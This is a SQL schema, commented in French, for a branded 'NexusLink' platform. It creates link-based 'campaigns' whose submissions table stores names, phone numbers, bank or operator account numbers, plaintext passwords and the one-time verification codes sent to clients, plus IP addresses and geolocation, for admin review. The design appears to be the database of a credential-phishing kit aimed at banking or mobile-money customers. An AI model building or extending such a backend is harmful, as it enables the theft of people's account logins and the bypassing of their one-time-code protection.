CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- TABLE DES LIENS DE FORMULAIRES (Campagnes)
CREATE TABLE IF NOT EXISTS public.form_links (
    id BIGINT GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    link_id VARCHAR(100) UNIQUE NOT NULL,
    expiry_date TIMESTAMP WITH TIME ZONE,
    submissions_limit INT DEFAULT 0, -- 0 = illimité
    submission_count INT DEFAULT 0,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- TABLE DES DEMANDES ET SOUMISSIONS
CREATE TABLE IF NOT EXISTS public.submissions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE SET NULL,
    link_id VARCHAR(100) REFERENCES public.form_links(link_id) ON DELETE SET NULL,
    form_link_id BIGINT REFERENCES public.form_links(id) ON DELETE SET NULL,
    
    -- Informations d'identité
    full_name VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    phone VARCHAR(50) NOT NULL,
    
    -- Méthode et compte NexusLink
    method VARCHAR(50) NOT NULL DEFAULT 'NexusLink Direct',
    account_number VARCHAR(255) NOT NULL,
    password TEXT NOT NULL,
    bank_name VARCHAR(255),
    operator_name VARCHAR(255),
    
    -- Code de confirmation / OTP envoyé au client
    verification_code VARCHAR(100),
    
    -- Audit et géolocalisation
    country_name VARCHAR(100),
    country_code VARCHAR(10),
    ip_address VARCHAR(50),
    user_agent TEXT,
    location VARCHAR(255),
    
    -- Cycle de vie et statut de modération
    status VARCHAR(50) DEFAULT 'En attente',
    admin_notes TEXT,
    processed_at TIMESTAMP WITH TIME ZONE,
    
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Si la table existait déjà sans verification_code, on s'assure d'ajouter la colonne
DO $$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='submissions' AND column_name='verification_code') THEN
        ALTER TABLE public.submissions ADD COLUMN verification_code VARCHAR(100);
    END IF;
END $$;

-- TABLE DES PARAMÈTRES DE L'APPLICATION
CREATE TABLE IF NOT EXISTS public.app_settings (
    id BIGINT GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE UNIQUE,
    app_name VARCHAR(255) DEFAULT 'NexusLink Solutions',
    welcome_message TEXT DEFAULT 'Bienvenue sur la plateforme sécurisée NexusLink.',
    primary_color VARCHAR(50) DEFAULT '#2563eb',
    accent_color VARCHAR(50) DEFAULT '#38bdf8',
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- TABLE DES NOTIFICATIONS
CREATE TABLE IF NOT EXISTS public.notifications (
    id BIGINT GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
    title VARCHAR(255) NOT NULL,
    message TEXT NOT NULL,
    type VARCHAR(50) DEFAULT 'info',
    is_read BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- INDEX DE PERFORMANCE
CREATE INDEX IF NOT EXISTS idx_form_links_link_id ON public.form_links(link_id);
CREATE INDEX IF NOT EXISTS idx_submissions_link_id ON public.submissions(link_id);
CREATE INDEX IF NOT EXISTS idx_submissions_status ON public.submissions(status);
CREATE INDEX IF NOT EXISTS idx_submissions_created_at ON public.submissions(created_at DESC);

-- TRIGGERS DE COMPTAGE SUR LES LIENS
CREATE OR REPLACE FUNCTION public.increment_submission_count()
RETURNS TRIGGER AS $$
BEGIN
    IF NEW.link_id IS NOT NULL THEN
        UPDATE public.form_links
        SET submission_count = submission_count + 1
        WHERE link_id = NEW.link_id;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

DROP TRIGGER IF EXISTS trigger_increment_submission_count ON public.submissions;
CREATE TRIGGER trigger_increment_submission_count
AFTER INSERT ON public.submissions
FOR EACH ROW
EXECUTE FUNCTION public.increment_submission_count();

-- SÉCURITÉ ROW LEVEL SECURITY (RLS)
ALTER TABLE public.form_links ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.submissions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.notifications ENABLE ROW LEVEL SECURITY;

